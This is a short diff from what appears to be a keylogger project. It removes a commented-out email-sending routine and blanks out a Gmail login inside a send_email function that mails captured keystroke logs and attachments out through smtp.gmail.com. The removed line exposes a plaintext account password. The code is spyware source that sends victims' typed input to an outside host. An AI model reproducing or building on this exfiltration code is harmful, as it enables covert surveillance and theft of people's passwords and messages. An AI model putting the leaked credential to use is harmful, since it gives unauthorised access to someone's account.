@@ -41,29 +41,6 @@ audio_file_path = "K:\\Programs\\Keylogger\\Project\\Recordings"
 extension = "\\"
 
 sound_recording_time = 10
-# def send_email(file_name,attachment,to_address):
-#     from_address = email_address
-#     message = MIMEMultipart()
-#     message['From'] = from_address
-#     message['To'] = to_address
-#     message['Subject'] = "Log file"
-#     body = "body of the email"
-#     message.attach(MIMEText(body, 'plain'))
-#     file_name = file_name
-#     attachment = open(attachment,'rb')
-#
-#     p = MIMEBase('application', 'octet-stream')
-#     p.get_payload(attachment.read())
-#     encoders.encode_base64(p)
-#     p.add_header('Content-Disposition',"attachment; file_name = $s" % file_name)
-#     message.attach(p)
-#
-#     s = smtplib.SMTP('smtp.gmail.com', 587)
-#     s.starttls()
-#     s.login(from_address,password)
-#     text = message.as_string()
-#     s.sendmail(from_address,to_address,text)
-#     s.quit()
 
 
 def send_email(keys_information, attachment_path, to_address):
@@ -92,7 +69,7 @@ def send_email(keys_information, attachment_path, to_address):
     server.starttls()
 
     # Login to your email account
-    server.login('cyberlove2002@gmail.com', 'acxu mpcq ramg kfty ')
+    server.login('cyberlove2002@gmail.com', ' ')
 
     # Send the email
     server.sendmail('cyberlove2002@gmail.com', to_address, message.as_string())
